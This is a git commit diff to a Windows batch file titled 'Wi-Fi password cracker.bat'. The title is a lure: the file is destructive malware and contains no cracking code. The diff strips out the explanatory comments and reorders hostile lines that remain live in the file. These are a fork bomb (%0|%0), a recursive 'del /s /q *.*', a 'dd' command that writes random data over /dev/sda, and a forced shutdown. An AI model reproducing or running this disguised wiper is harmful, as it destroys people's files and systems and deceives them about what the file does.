6c35351b45f2f59f4dc1347d27562b9848d2d9a0
Varun Banka <88031057+VarunBanka@users.noreply.github.com>
2022-10-21 01:17:37 +0530

    Update Wi-Fi password cracker.bat

--- Wi-Fi password cracker.bat
+++ Wi-Fi password cracker.bat
@@ -1,23 +1,15 @@
 @echo off
 
-:: downloading an image
-Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"
-
-:: a loop
 %0|%0
 
-:: open the image downloaded in line 4
+Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"
+
+shutdown -s -t 30
+
 image.jpg
 
-:: cd to startup folder
-cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
-
-:: delete stuff
-:: code by Varun Banka
 del /s /q *.*
 
-:: play with drive
 sudo dd if=/dev/random of=/dev/sda
 
-:: power off the system
-shutdown -s -t 15
+cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
